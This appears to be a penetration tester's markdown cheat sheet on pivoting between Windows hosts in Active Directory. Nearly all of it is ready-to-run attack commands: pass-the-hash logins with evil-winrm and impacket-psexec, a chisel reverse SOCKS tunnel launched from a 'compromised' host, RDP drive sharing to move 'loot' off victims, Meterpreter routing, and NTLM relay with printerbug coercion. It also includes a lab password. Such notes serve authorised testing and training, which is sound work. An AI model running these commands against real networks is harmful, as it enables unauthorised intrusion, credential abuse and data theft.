## Windows Pivoting

Movement between Windows hosts in an AD environment. Three concerns:
1. **Authenticated remote execution** (RDP / WinRM / SMB / WMI).
2. **Network pivoting** when the next-hop host isn't directly reachable from Kali.
3. **File and clipboard movement** during interactive use.

---

### Remote Execution Options

| Tool | Auth | Shell type | Default port |
|------|------|------------|--------------|
| `evil-winrm` | password / NTLM / Kerberos | Full PowerShell | 5985 / 5986 |
| `impacket-psexec` | password / NTLM | Interactive, SYSTEM | 445 |
| `impacket-wmiexec` | password / NTLM | Semi-interactive, user | 135 + dyn |
| `impacket-smbexec` | password / NTLM | Non-interactive cmd | 445 |
| `xfreerdp` | password / NLA | GUI | 3389 |

#### evil-winrm

```bash
evil-winrm -i <ip> -u <user> -p <pass>
evil-winrm -i <ip> -u <user> -H <NTLM>
evil-winrm -i <ip> -u <user> -p <pass> -s /opt/scripts   # share local scripts
```

Inside evil-winrm:

```bash
menu
upload /path/local /target/path
download /target/path /path/local
invoke-binary /opt/binaries/SharpHound.exe
```

#### impacket-psexec

```bash
impacket-psexec <DOMAIN>/<user>@<ip> -hashes :<NTLM>
impacket-psexec <DOMAIN>/<user>:'<pass>'@<ip>
```

#### xfreerdp (with clipboard + drive sharing — easiest Windows file transfer)

```bash
## Quick — clipboard only
xfreerdp /u:'Bob' /p:'HTB_@cademy_stdnt!' /v:10.129.202.99 +clipboard

## With a shared loot drive (drag-and-drop both ways)
mkdir -p /home/kali/loot
xfreerdp3 /v:172.16.119.10 /u:'NEXURA\stom' /p:'<pass>' \
    /cert:ignore +clipboard /drive:loot,/home/kali/loot
```

- On the Windows victim, your share is `\\tsclient\loot`
- On Kali, files land in `/home/kali/loot`

#### RDP Pass-the-Hash (`/pth:`)

Requires Restricted Admin enabled on the target — see [AD Initial Access → RDP PtH](../3-exploitation/05-ad-initial-access.md).

#### RDP enumeration / security check

```bash
nmap -p 3389 --script rdp-enum-encryption <ip>
## If NLA = SUCCESS, you can reach the login screen with rdesktop
```

### Port Forwarding

#### chisel (TCP over HTTP — most reliable through proxies)

Use when you need a direct connection from Kali to a host you can't reach (file transfers too painful, weird egress, etc.).

```bash
## On Kali — install
wget https://github.com/jpillora/chisel/releases/download/v1.7.7/chisel_1.7.7_linux_amd64.gz
gzip -d chisel_1.7.7_linux_amd64.gz
mv chisel_* chisel && chmod +x ./chisel

## On Kali (server)
sudo ./chisel server --reverse -p 8080

## On compromised Windows host (client)
c:\tools\chisel.exe client <kali>:8080 R:socks
```

Configure proxychains on Kali:

```bash
cat /etc/proxychains.conf
...
[ProxyList]
socks5 127.0.0.1 1080
```

Then use it:

```bash
proxychains impacket-wmiexec dc01 -k
proxychains nmap -sT -Pn -sCV <ip>           # MUST be TCP-only over SOCKS
```

> nmap over proxychains must be `-sT` (full TCP connect) — SYN scans don't survive a SOCKS hop. Stick to ports you care about; it's slow.

#### SSH tunneling (if SSH available)

```bash
## Local forward — reach 80 on remote-internal via Kali
ssh -L 8000:internal-host:80 user@jump-box

## Reverse forward — give Kali to the remote
ssh -R 9000:127.0.0.1:9000 user@jump-box

## Dynamic SOCKS — entire subnet via the jump box
ssh -D 1080 user@jump-box
```

#### proxychains (use a SOCKS chain transparently)

`/etc/proxychains.conf` (or `proxychains4.conf`):

```bash
[ProxyList]
socks5 127.0.0.1 1080
```

```bash
proxychains nmap -sT -Pn <internal-ip>
proxychains impacket-psexec <DOMAIN>/<user>@<internal-ip>
proxychains evil-winrm -i <internal-ip> -u <user> -p '<pass>'
```

> `nmap` over proxychains must be `-sT` (full TCP connect) — SYN scans don't survive a SOCKS hop.

#### Meterpreter port forward

```bash
portfwd add -l 8000 -p 80 -r <internal-ip>
route add <subnet> <mask> <session-id>
use auxiliary/server/socks_proxy
```

### File Movement During an RDP Session

- **Clipboard** — enabled via `+clipboard` in xfreerdp; copy/paste text directly.
- **Drive share** — `/drive:share,/root/rdp-share` exposes Kali path as `\\tsclient\share` on Windows.
- **SCP back to Kali** (after pulling files to a Windows folder):
  ```bash
  scp Administrator@<victim>:/C:/path/to/loot ./loot
  ```

### Coercing Authentication for Relay

| Tool | Mechanism |
|------|-----------|
| `printerbug` | Spoolss RPC `RpcRemoteFindFirstPrinterChangeNotificationEx` |
| `PetitPotam` | EFSRPC `EfsRpcOpenFileRaw` (and friends) |
| `DFSCoerce` | MS-DFSNM |
| `ShadowCoerce` | MS-FSRVP |

Used in combination with `impacket-ntlmrelayx -t ldap://<dc-ip>` to take over hosts that don't enforce SMB signing.

```bash
sudo impacket-ntlmrelayx -t ldap://<dc-ip> -smb2support
## In a separate tab
python3 printerbug.py <DOMAIN>/<user>:<pass>@<vuln-host> <kali-ip>
```

### See Also
- [AD Initial Access](../3-exploitation/05-ad-initial-access.md) — the credential/hash you need to authenticate.
- [Kerberos Attacks](./03-kerberos-attacks.md) — ticket-based variants of the above.
- [Credential Dumping](../4-post-exploitation/03-credential-dumping.md) — for each hop, dump and reuse.
